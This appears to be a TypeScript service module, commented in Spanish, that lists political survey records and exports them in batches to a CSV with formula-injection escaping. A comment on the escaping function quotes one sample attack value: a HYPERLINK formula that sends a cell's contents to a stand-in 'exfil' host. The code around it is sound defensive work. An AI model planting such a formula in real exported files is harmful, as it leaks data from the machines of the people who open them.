// Servicio del lado REVISOR_QA para "Encuestas Okrean": listado paginado y
// lectura por lotes para el CSV. Es una RÉPLICA de qaExternaPersonasService (y su
// router hermano), no una extracción a una lib compartida: cada módulo de captura
// debe poder borrarse entero sin dejar utilidades huérfanas, y el repo ya tiene
// ese precedente documentado (qaExternaPersonasValidator.ts:27-31 duplica a
// propósito la validación de rango). A la tercera copia, unificar el CSV
// (escritor con contrapresión, csvEscape, cursor) en api/src/lib/csv.ts.
//
// Dos propiedades que se conservan del molde:
//
//  1. El filtro de fechas acota en UTC con límite superior EXCLUSIVO. Un
//     `lte: new Date(dateTo + 'T23:59:59')` se interpreta en la hora LOCAL del
//     proceso y corre el día según la TZ del contenedor.
//  2. La exportación se lee por lotes con cursor sobre `id` y nunca materializa
//     el resultado completo en RAM (.claude/rules/backend.md §B): el servidor
//     comparte hardware con el SAS.

import prisma from '../lib/prisma';
import { Prisma, EncuestaEstado } from '@prisma/client';
import { GOBERNANTES_V3 } from '../validators/encuestasIngestValidator';

/** Tope duro de filas exportables en una sola petición. */
export const MAX_ENCUESTAS_EXPORT = 50_000;

/** Tamaño de lote de la exportación (filas por consulta). */
export const ENCUESTAS_EXPORT_BATCH = 1_000;

export interface EncuestasListQuery {
  page?: number;
  limit?: number;
  dispositivo?: string;
  dateFrom?: string;
  dateTo?: string;
}

/** Encuesta serializada para el listado del portal de revisión (v3). */
export interface EncuestaDto {
  id: number;
  idRemoto: string;
  folioLocal: string | null;
  /** null = registro capturado por una app anterior al campo. */
  encuestador: string | null;
  versionCuestionario: number;
  preferenciaElectoral: string | null;
  preferenciaPartido: string | null;
  conoceLalo: string | null;
  duracionSegundos: number;
  fechaHoraFinalizacion: Date;
  recibidoEn: Date;
  /** null = el payload no traía bloque de ubicación; distinto de `false`. */
  ubicacionDisponible: boolean | null;
  dispositivo: { id: number; identificador: string };
}

/**
 * Fila completa que alimenta el CSV (v3). Los campos JSONB se tipan `unknown`
 * a propósito: Postgres devuelve lo que se guardó, y el pivoteo comprueba la
 * forma en tiempo de ejecución en vez de confiar en un tipo que la BD no
 * garantiza.
 *
 * `payloadRaw` y `payloadHash` NO están aquí ni en el select: el body crudo del
 * teléfono es solo auditoría y no sale del servidor.
 */
export interface EncuestaExportRow {
  id: number;
  idRemoto: string;
  idLocal: string;
  folioLocal: string | null;
  encuestador: string | null;
  recibidoEn: Date;
  fechaHoraInicio: Date;
  fechaHoraFinalizacion: Date;
  duracionSegundos: number;
  estado: EncuestaEstado;
  versionCuestionario: number;
  sexo: string | null;
  rangoEdad: string | null;
  empresariosConocidos: unknown;
  politicosConocidos: unknown;
  conoceLalo: string | null;
  rolLalo: string | null;
  opinionLalo: string | null;
  preferenciaElectoral: string | null;
  preferenciaPartido: string | null;
  aprobacionPorGobernante: unknown;
  ubicacionDisponible: boolean | null;
  ubicacionLat: number | null;
  ubicacionLng: number | null;
  ubicacionPrecisionM: number | null;
  ubicacionEsValida: boolean | null;
  ubicacionCapturadaAt: Date | null;
  ubicacionPermiso: string | null;
  ubicacionServicioActivo: boolean | null;
  ubicacionMotivoNoDisponible: string | null;
  dispositivoPlataforma: string;
  dispositivoModelo: string;
  dispositivoVersionSistema: string;
  versionAplicacion: string;
  dispositivo: { id: number; identificador: string };
}

const dispositivoSelect = { select: { id: true, identificador: true } } as const;

/**
 * Columnas del listado: EXACTAMENTE las del DTO v3. Se usa `select` y no `include`
 * porque `include` trae además todos los escalares del modelo, y uno de ellos es
 * `payload_raw`: el body JSON completo del teléfono, que el DTO tira a la basura.
 * Con `include`, una página de 100 filas movería cientos de KB de texto desde la
 * BD a la RAM del proceso para descartarlos acto seguido.
 */
const encuestaListSelect = {
  id: true,
  idRemoto: true,
  folioLocal: true,
  encuestador: true,
  versionCuestionario: true,
  preferenciaElectoral: true,
  preferenciaPartido: true,
  conoceLalo: true,
  duracionSegundos: true,
  fechaHoraFinalizacion: true,
  recibidoEn: true,
  ubicacionDisponible: true,
  dispositivo: dispositivoSelect,
} as const;

/**
 * Columnas de la exportación: el CSV v3 con 36 cabeceras. Es un select
 * distinto del listado a propósito —el CSV sí lleva los JSONB y el bloque de
 * ubicación completo—, pero comparte con él las dos exclusiones que importan:
 * `payloadRaw` y `payloadHash`.
 */
const encuestaExportSelect = {
  id: true,
  idRemoto: true,
  idLocal: true,
  folioLocal: true,
  encuestador: true,
  recibidoEn: true,
  fechaHoraInicio: true,
  fechaHoraFinalizacion: true,
  duracionSegundos: true,
  estado: true,
  versionCuestionario: true,
  sexo: true,
  rangoEdad: true,
  empresariosConocidos: true,
  politicosConocidos: true,
  conoceLalo: true,
  rolLalo: true,
  opinionLalo: true,
  preferenciaElectoral: true,
  preferenciaPartido: true,
  aprobacionPorGobernante: true,
  ubicacionDisponible: true,
  ubicacionLat: true,
  ubicacionLng: true,
  ubicacionPrecisionM: true,
  ubicacionEsValida: true,
  ubicacionCapturadaAt: true,
  ubicacionPermiso: true,
  ubicacionServicioActivo: true,
  ubicacionMotivoNoDisponible: true,
  dispositivoPlataforma: true,
  dispositivoModelo: true,
  dispositivoVersionSistema: true,
  versionAplicacion: true,
  dispositivo: dispositivoSelect,
} as const;

/**
 * Where compartido por el listado y la exportación: un solo lugar donde se
 * traducen los filtros del revisor, para que el CSV nunca contenga un conjunto
 * distinto del que se está viendo en pantalla.
 */
export function buildWhere(params: EncuestasListQuery): Prisma.EncuestaWhereInput {
  const where: Prisma.EncuestaWhereInput = {};
  if (params.dispositivo) {
    // Por etiqueta del equipo, no por id: es lo que el revisor tiene a mano.
    where.dispositivo = {
      identificador: { contains: params.dispositivo, mode: 'insensitive' },
    };
  }
  if (params.dateFrom || params.dateTo) {
    // Día civil completo en UTC: [dateFrom 00:00Z, dateTo+1 00:00Z). El rango va
    // sobre fechaHoraFinalizacion (cuándo se levantó la encuesta), no sobre
    // recibidoEn: un teléfono sin señal puede sincronizar días después.
    const dateToExclusive = params.dateTo ? new Date(`${params.dateTo}T00:00:00.000Z`) : null;
    if (dateToExclusive) dateToExclusive.setUTCDate(dateToExclusive.getUTCDate() + 1);
    where.fechaHoraFinalizacion = {
      ...(params.dateFrom ? { gte: new Date(`${params.dateFrom}T00:00:00.000Z`) } : {}),
      ...(dateToExclusive ? { lt: dateToExclusive } : {}),
    };
  }
  return where;
}

// Segunda red bajo `encuestaListSelect`: la consulta ya no pide `payloadRaw`, y
// este mapeo explícito garantiza que tampoco lo exponga quien algún día vuelva a
// `include`.
function toDto(row: EncuestaDto): EncuestaDto {
  return {
    id: row.id,
    idRemoto: row.idRemoto,
    folioLocal: row.folioLocal,
    encuestador: row.encuestador,
    versionCuestionario: row.versionCuestionario,
    preferenciaElectoral: row.preferenciaElectoral,
    preferenciaPartido: row.preferenciaPartido,
    conoceLalo: row.conoceLalo,
    duracionSegundos: row.duracionSegundos,
    fechaHoraFinalizacion: row.fechaHoraFinalizacion,
    recibidoEn: row.recibidoEn,
    ubicacionDisponible: row.ubicacionDisponible,
    dispositivo: { id: row.dispositivo.id, identificador: row.dispositivo.identificador },
  };
}

export async function list(params: EncuestasListQuery) {
  const page = params.page || 1;
  const limit = params.limit || 20;
  const skip = (page - 1) * limit;
  const where = buildWhere(params);

  const [rows, total] = await Promise.all([
    prisma.encuesta.findMany({
      where,
      skip,
      take: limit,
      // Por estampa del servidor: es el orden en que el revisor las ve llegar y
      // el único que no depende del reloj del teléfono.
      orderBy: { recibidoEn: 'desc' },
      select: encuestaListSelect,
    }),
    prisma.encuesta.count({ where }),
  ]);

  const data: EncuestaDto[] = rows.map(toDto);
  return { data, pagination: { page, limit, total, totalPages: Math.ceil(total / limit) } };
}

/**
 * Lee el conjunto a exportar por lotes, ordenado por `id` ascendente y paginado
 * con cursor (no con OFFSET, que degrada al avanzar). Corta en
 * MAX_ENCUESTAS_EXPORT: quien necesite más que descargue por rangos.
 */
export async function* iterateForExport(
  params: EncuestasListQuery,
  batchSize = ENCUESTAS_EXPORT_BATCH,
): AsyncGenerator<EncuestaExportRow[]> {
  const where = buildWhere(params);
  let cursorId: number | undefined;
  let emitidas = 0;

  while (emitidas < MAX_ENCUESTAS_EXPORT) {
    const take = Math.min(batchSize, MAX_ENCUESTAS_EXPORT - emitidas);
    const rows = await prisma.encuesta.findMany({
      where,
      take,
      orderBy: { id: 'asc' },
      ...(cursorId !== undefined ? { cursor: { id: cursorId }, skip: 1 } : {}),
      select: encuestaExportSelect,
    });

    if (rows.length === 0) return;
    emitidas += rows.length;
    cursorId = rows[rows.length - 1].id;
    yield rows;
    // Lote incompleto = se acabó el conjunto; ahorra una consulta vacía.
    if (rows.length < take) return;
  }
}

/**
 * Encabezados del CSV v3 (36 columnas), en el mismo orden que produce toCsvRow.
 * Las 3 columnas de aprobación hacen pivoteo del JSONB por orden de GOBERNANTES_V3:
 * una columna fija por gobernante es lo que permite ordenar y graficar en Excel.
 */
export const ENCUESTAS_CSV_HEADERS = [
  'ID remoto',
  'ID local',
  'Folio',
  'Encuestador',
  'Recibido (UTC)',
  'Inicio (UTC)',
  'Finalización (UTC)',
  'Duración (s)',
  'Estado',
  'Versión cuestionario',
  'Sexo',
  'Rango edad',
  'Empresarios conocidos',
  'Políticos conocidos',
  'Conoce Lalo',
  'Rol Lalo',
  'Opinión Lalo',
  'Preferencia electoral',
  'Preferencia partido',
  'Aprobación sheinbaum',
  'Aprobación jara',
  'Aprobación huerta',
  'Ubicación disponible',
  'Latitud',
  'Longitud',
  'Precisión (m)',
  'Ubicación válida',
  'Captura GPS (UTC)',
  'Permiso ubicación',
  'Servicio ubicación activo',
  'Motivo no disponible',
  'Plataforma',
  'Modelo',
  'Versión sistema',
  'Versión app',
  'Dispositivo',
] as const;

/** Celdas que Excel/LibreOffice evalúan como fórmula al abrir el archivo. */
const ARRANQUE_DE_FORMULA = /^[=+\-@\t\r]/;

/**
 * Escapa un valor para CSV (RFC 4180): entrecomilla si contiene coma, comilla,
 * salto de línea o retorno de carro, y duplica las comillas internas.
 * null/undefined salen como celda vacía, no como el texto "null".
 *
 * Además neutraliza las celdas de TEXTO que empiezan por `=`, `+`, `-`, `@`, TAB
 * o CR, anteponiéndoles un apóstrofo (la marca de "esto es texto" de Excel) y
 * entrecomillando siempre para que el apóstrofo viaje literal. Aquí hace falta
 * porque varias columnas son texto libre del teléfono —modelo, versión del
 * sistema, versión de la app, folio, encuestador, identificador del
 * dispositivo— y un equipo con API key válida puede mandar
 * `=HYPERLINK("http://exfil/?"&A2,"ok")` como modelo: la celda se ejecutaría en
 * la máquina del revisor al abrir el archivo.
 *
 * Los `number` quedan exentos: `-99.133209` es una coordenada, y prefijarla
 * rompería las columnas de latitud/longitud/precisión que el revisor sí grafica.
 *
 * Réplica de qaExternaPersonasService.csvEscape (ver cabecera del archivo).
 */
export function csvEscape(value: unknown): string {
  if (value === null || value === undefined) return '';
  const s = String(value);
  if (typeof value !== 'number' && ARRANQUE_DE_FORMULA.test(s)) {
    return `"'${s.replace(/"/g, '""')}"`;
  }
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/**
 * Pivotea el JSONB de aprobación ([{gobernante, calificacion}]) a un mapa
 * gobernante→calificación. Ignora lo que no tenga la forma esperada en vez de
 * reventar: el CSV de 50 000 filas no puede caerse por una fila anómala (una
 * v1 residual trae NULL aquí).
 */
function calificacionesPorGobernante(valor: unknown): Map<string, string> {
  const mapa = new Map<string, string>();
  if (!Array.isArray(valor)) return mapa;
  for (const fila of valor) {
    if (!fila || typeof fila !== 'object') continue;
    const { gobernante, calificacion } = fila as { gobernante?: unknown; calificacion?: unknown };
    if (typeof gobernante === 'string' && typeof calificacion === 'string') {
      mapa.set(gobernante, calificacion);
    }
  }
  return mapa;
}

/**
 * Lista de nombres (texto libre) unida con ';'. Se emite en el orden guardado
 * (que es el orden en que el encuestador la dictó); cada entrada ya pasó por
 * el tope de 80 chars del validador y la celda completa pasa por csvEscape.
 */
function celdaDeLista(valor: unknown): string {
  if (!Array.isArray(valor)) return '';
  return valor.filter((v): v is string => typeof v === 'string').join(';');
}

/** Booleano de tres estados: NULL (dato ausente) es celda vacía, no "no". */
function siNo(valor: boolean | null | undefined): string {
  if (valor === null || valor === undefined) return '';
  return valor ? 'si' : 'no';
}

/** Una fila del CSV v3, terminada en CRLF (lo que espera Excel). */
export function toCsvRow(encuesta: EncuestaExportRow): string {
  const calificaciones = calificacionesPorGobernante(encuesta.aprobacionPorGobernante);

  return (
    [
      encuesta.idRemoto,
      encuesta.idLocal,
      encuesta.folioLocal,
      // Texto libre que teclea el encuestador en el teléfono: pasa por
      // csvEscape como el resto (comas, comillas y arranque de fórmula).
      encuesta.encuestador,
      // Todas las fechas en UTC, igual que se persisten: la hora local del
      // revisor no debe cambiar el contenido del archivo.
      encuesta.recibidoEn.toISOString(),
      encuesta.fechaHoraInicio.toISOString(),
      encuesta.fechaHoraFinalizacion.toISOString(),
      encuesta.duracionSegundos,
      encuesta.estado,
      encuesta.versionCuestionario,
      encuesta.sexo,
      encuesta.rangoEdad,
      celdaDeLista(encuesta.empresariosConocidos),
      celdaDeLista(encuesta.politicosConocidos),
      encuesta.conoceLalo,
      encuesta.rolLalo,
      encuesta.opinionLalo,
      encuesta.preferenciaElectoral,
      encuesta.preferenciaPartido,
      // Las 3 columnas de aprobación por gobernante, en orden de GOBERNANTES_V3.
      ...GOBERNANTES_V3.map((g) => calificaciones.get(g) ?? ''),
      siNo(encuesta.ubicacionDisponible),
      encuesta.ubicacionLat,
      encuesta.ubicacionLng,
      encuesta.ubicacionPrecisionM,
      siNo(encuesta.ubicacionEsValida),
      encuesta.ubicacionCapturadaAt ? encuesta.ubicacionCapturadaAt.toISOString() : '',
      encuesta.ubicacionPermiso,
      siNo(encuesta.ubicacionServicioActivo),
      encuesta.ubicacionMotivoNoDisponible,
      encuesta.dispositivoPlataforma,
      encuesta.dispositivoModelo,
      encuesta.dispositivoVersionSistema,
      encuesta.versionAplicacion,
      // El equipo registrado que porta la API key.
      encuesta.dispositivo.identificador,
    ]
      .map(csvEscape)
      .join(',') + '\r\n'
  );
}
